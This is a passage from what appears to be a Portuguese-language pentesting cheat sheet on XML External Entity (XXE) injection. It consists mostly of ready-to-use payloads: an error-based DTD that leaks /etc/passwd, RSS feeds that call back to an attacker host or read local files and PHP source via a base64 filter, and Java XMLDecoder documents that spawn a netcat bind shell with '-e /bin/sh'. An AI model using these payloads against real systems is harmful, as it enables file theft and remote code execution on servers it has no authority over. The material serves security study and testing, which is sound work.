<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Essa modificação leva à exfiltração bem-sucedida do conteúdo do arquivo, conforme refletido na saída de erro enviada via HTTP. Isso indica um ataque XXE (XML External Entity) bem-sucedido, aproveitando tanto técnicas Out of Band quanto Error-Based para extrair informações sensíveis.

## RSS - XEE

XML válido com formato RSS para explorar uma vulnerabilidade XXE.

### Ping back

Solicitação HTTP simples para o servidor dos atacantes.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Ler arquivo
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Ler código-fonte

Usando o filtro base64 do PHP
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE para RCE

XMLDecoder é uma classe Java que cria objetos com base em uma mensagem XML. Se um usuário malicioso conseguir fazer um aplicativo usar dados arbitrários em uma chamada ao método **readObject**, ele ganhará instantaneamente a execução de código no servidor.

### Usando Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Ferramentas

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Referências

- [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
- [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
- Extrair informações via HTTP usando seu próprio DTD externo: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
- [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
- [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
- [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
- [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../banners/hacktricks-training.md}}
